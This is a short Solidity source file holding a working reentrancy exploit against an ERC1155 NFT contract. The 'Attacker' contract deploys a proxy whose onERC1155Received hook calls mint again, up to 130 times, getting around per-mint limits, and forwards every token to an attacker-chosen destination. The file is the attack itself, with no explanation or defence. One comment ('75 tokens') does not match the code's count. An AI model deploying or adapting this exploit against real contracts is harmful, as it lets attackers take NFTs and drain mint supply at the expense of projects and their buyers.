//SPDX-License-Identifier: MIT
pragma solidity 0.8.4;

import "hardhat/console.sol";
import "@openzeppelin/contracts/token/ERC1155/IERC1155Receiver.sol";

interface NFT1155Contract {
  function mint(uint256 id, uint256 amount) external;

  function safeTransferFrom(
    address from,
    address to,
    uint256 id,
    uint256 amount,
    bytes memory data
  ) external;
}

contract AttackerProxy {
  NFT1155Contract private immutable nftContract;
  address private destination;

  uint256 private tokenCount = 0;

  constructor(address _nftAddr, address _dest) {
    nftContract = NFT1155Contract(_nftAddr);
    destination = _dest;
  }

  function attack() external {
    // call mint - this will trigger the receiver hook leading to the exploits

    nftContract.mint(1, 1);
  }

  // ensure to configure erc1155 receiver for this to work

  function onERC1155Received(
    address operator,
    address from,
    uint256 id,
    uint256 value,
    bytes calldata data
  ) external returns (bytes4) {
    // say we want to mint 75 tokens not just one
    tokenCount++;
    if (tokenCount < 130) {
      nftContract.mint(1, 1);
    }
    nftContract.safeTransferFrom(address(this), destination, id, value, data);
    return IERC1155Receiver.onERC1155Received.selector;
  }
}

contract Attacker {
  constructor(address _victim, address _dest) {
    AttackerProxy ap = new AttackerProxy(_victim, _dest);
    ap.attack();
  }
}
